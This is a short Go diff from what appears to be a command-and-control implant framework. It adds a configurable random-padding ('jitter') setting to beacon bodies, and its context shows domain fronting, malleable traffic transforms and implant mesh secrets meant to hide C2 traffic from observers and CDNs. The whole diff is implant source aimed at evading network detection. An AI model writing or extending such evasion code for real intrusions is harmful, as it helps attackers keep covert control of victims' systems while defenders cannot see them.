@@ -55,7 +55,7 @@ var (
 	RegSecretStr            string            = ""                            // v3: per-implant registration secret, base64 ("" = v2 master-key derivation)
 	P2PSharedSecret         string            = ""                            // P2P relay pre-shared key (base64 32 bytes). Build pipelines stamp this via -ldflags so parent + child implants share a mesh key. "" = no P2P auth (legacy)
 	DomainFront             string            = ""                            // Domain fronting: when set, the TLS SNI (via uTLS) and HTTP Host header both present this domain while the connection still egresses to C2URL. Point C2URL at the CDN/proxy edge and set DomainFront to the fronted hostname so passive observers (and the CDN) see only the fronted domain. "" = disabled
-	ContentLengthJitter     int               = 0                             // Max random padding bytes for HTTP body (0=disabled)
+	ContentLengthJitter     int               = 0                             // Max random padding bytes for HTTP/WS beacon body (0=disabled)
 	MalleablePrepend        string            = ""                            // bytes prepended to every HTTP beacon response body (server malleable profile)
 	// MalleableRespDecode holds the serialized output transforms (e.g.
 	// "base64;xor:microsoft") of the server's malleable profile. When non-empty
@@ -208,6 +208,10 @@ type agentConfigBlob struct {
 	// MalleableRespDecode is the over-the-wire form of the server's profile
 	// output transforms; non-empty when a malleable profile preset is active.
 	MalleableRespDecode string `json:"malleable_resp_decode"`
+	// Max random bytes appended to the HTTP/WS beacon body (0=disabled). Kept
+	// as a string to match the -X injection convention used by every other
+	// runtime knob on this struct.
+	ContentLengthJitter string `json:"content_length_jitter"`
 	// Request-side transforms applied by the agent to outbound beacons.
 	MalleableRequestPrepend string            `json:"malleable_request_prepend"`
 	MalleableRequestAppend  string            `json:"malleable_request_append"`
@@ -512,5 +516,16 @@ func (b *agentConfigBlob) apply() {
 	}
 	if b.MalleableRequestHeaders != nil {
 		MalleableRequestHeaders = b.MalleableRequestHeaders
+	}
+	if b.ContentLengthJitter != "" {
+		if v, err := strconv.Atoi(b.ContentLengthJitter); err == nil {
+			if v < 0 {
+				v = 0
+			}
+			if v > 4096 {
+				v = 4096
+			}
+			ContentLengthJitter = v
+		}
 	}
 }
